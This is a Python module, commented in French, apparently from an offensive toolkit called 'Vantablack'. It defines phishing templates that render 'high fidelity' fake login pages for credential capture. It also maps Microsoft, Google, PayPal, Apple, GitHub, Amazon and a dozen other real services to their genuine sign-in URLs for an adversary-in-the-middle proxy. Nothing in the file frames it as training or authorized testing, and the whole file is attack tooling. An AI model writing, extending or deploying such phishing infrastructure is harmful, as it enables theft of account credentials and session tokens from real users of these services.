import os
import re
from abc import ABC, abstractmethod
from typing import Dict, Optional, List

class PhishingTemplate(ABC):
    """
    Classe de base pour les templates de phishing.
    """
    def __init__(self, name: str, description: str):
        self.name = name
        self.description = description
        
    @abstractmethod
    def render(self, context: Optional[Dict[str, str]] = None) -> str:
        """Rend le contenu HTML du template."""
        pass
        
    @property
    @abstractmethod
    def target_url(self) -> str:
        """URL cible réelle (pour le proxy AiTM)."""
        pass

    def _load_html(self, filename: str) -> str:
        """Charge le contenu HTML depuis le dossier templates haute fidélité."""
        try:
            # Chemin absolu basé sur la structure du projet
            # On remonte de core/social/templates.py vers core/assets/templates/high_fidelity/
            base_path = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))) # Vantablack_Clean/
            path = os.path.join(base_path, "core", "assets", "templates", "high_fidelity", filename)
            
            if not os.path.exists(path):
                # Fallback vers l'ancien dossier si le nouveau n'existe pas
                alt = os.path.join(os.path.dirname(os.path.abspath(__file__)), "html_templates", filename)
                if os.path.exists(alt):
                    path = alt
                else:
                    # Troisième fallback: dossier racine "templates/"
                    alt2 = os.path.join(base_path, "templates", filename)
                    path = alt2
                
            with open(path, "r", encoding="utf-8") as f:
                return f.read()
        except Exception as e:
            print(f"Error loading template {filename}: {e}")
            return "<h1>Template Error</h1>"

    def _apply_context(self, html: str, context: Optional[Dict[str, str]] = None) -> str:
        """Remplace les variables {{ key }} par les valeurs du contexte."""
        if not context:
            context = {}
        
        # Valeurs par défaut
        if "email" not in context:
            context["email"] = ""
        if "company" not in context:
            context["company"] = "Security"

        for key, value in context.items():
            if value is None:
                value = ""
            # Remplacement tolérant aux espaces et sauts de ligne
            pattern = re.compile(r"\{\{\s*" + re.escape(key) + r"\s*\}\}", flags=re.MULTILINE)
            html = pattern.sub(str(value), html)
        return html

class MicrosoftLoginTemplate(PhishingTemplate):
    def __init__(self):
        super().__init__("Microsoft 365", "Faux login Microsoft 365 pour capture d'identifiants.")

    def render(self, context: Optional[Dict[str, str]] = None) -> str:
        html = self._load_html("microsoft.html")
        return self._apply_context(html, context)
        
    @property
    def target_url(self) -> str:
        return "https://login.microsoftonline.com"

class GoogleLoginTemplate(PhishingTemplate):
    def __init__(self):
        super().__init__("Google Workspace", "Faux login Google pour capture d'identifiants.")

    def render(self, context: Optional[Dict[str, str]] = None) -> str:
        html = self._load_html("google.html")
        return self._apply_context(html, context)

    @property
    def target_url(self) -> str:
        return "https://accounts.google.com"

class GenericUpdateTemplate(PhishingTemplate):
    def __init__(self):
        super().__init__("Generic Update", "Page de maintenance générique demandant une reconnexion.")

    def render(self, context: Optional[Dict[str, str]] = None) -> str:
        html = self._load_html("generic.html")
        return self._apply_context(html, context)

    @property
    def target_url(self) -> str:
        return "https://example.com" # Placeholder

class DynamicPhishingTemplate(PhishingTemplate):
    """
    Template chargé dynamiquement depuis un fichier HTML.
    """
    def __init__(self, filename: str, target_url: str):
        name = filename.replace(".html", "").capitalize()
        super().__init__(name, f"Template généré pour {name}")
        self.filename = filename
        self._target_url = target_url

    def render(self, context: Optional[Dict[str, str]] = None) -> str:
        html = self._load_html(self.filename)
        return self._apply_context(html, context)

    @property
    def target_url(self) -> str:
        return self._target_url

class TemplateLoader:
    """
    Charge automatiquement les templates depuis le dossier assets.
    """
    
    TARGET_URL_MAP = {
        "amazon": "https://www.amazon.com/ap/signin",
        "apple": "https://appleid.apple.com",
        "discord": "https://discord.com/login",
        "dropbox": "https://www.dropbox.com/login",
        "facebook": "https://www.facebook.com/login",
        "github": "https://github.com/login",
        "google": "https://accounts.google.com",
        "instagram": "https://www.instagram.com/accounts/login/",
        "linkedin": "https://www.linkedin.com/login",
        "microsoft": "https://login.microsoftonline.com",
        "paypal": "https://www.paypal.com/signin",
        "reddit": "https://www.reddit.com/login",
        "slack": "https://slack.com/signin",
        "tiktok": "https://www.tiktok.com/login",
        "yahoo": "https://login.yahoo.com",
        "teams_meeting": "https://teams.microsoft.com",
        "twitter": "https://twitter.com/login",
        "x": "https://x.com/login"
    }
    
    @staticmethod
    def load_all() -> Dict[str, PhishingTemplate]:
        templates: Dict[str, PhishingTemplate] = {}
        
        # Base path to high_fidelity templates
        base_path = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        templates_dir = os.path.join(base_path, "core", "assets", "templates", "high_fidelity")
        
        if not os.path.exists(templates_dir):
            return templates
            
        for filename in os.listdir(templates_dir):
            if filename.endswith(".html"):
                key = filename.replace(".html", "")
                target_url = TemplateLoader.TARGET_URL_MAP.get(key, "https://example.com")
                templates[key] = DynamicPhishingTemplate(filename, target_url)
                
        # Override with specialized classes if needed (though Dynamic handles them well now)
        # We can keep specialized classes if they have custom logic beyond simple rendering
        templates["microsoft"] = MicrosoftLoginTemplate()
        templates["google"] = GoogleLoginTemplate()
        templates["generic"] = GenericUpdateTemplate()
        
        # Socials: fournir une page X/Twitter via template racine si non présent en HF
        templates["twitter"] = DynamicPhishingTemplate("x_login_v2.html", TemplateLoader.TARGET_URL_MAP["twitter"])
        templates["x"] = DynamicPhishingTemplate("x_login_v2.html", TemplateLoader.TARGET_URL_MAP["x"])
        
        return templates
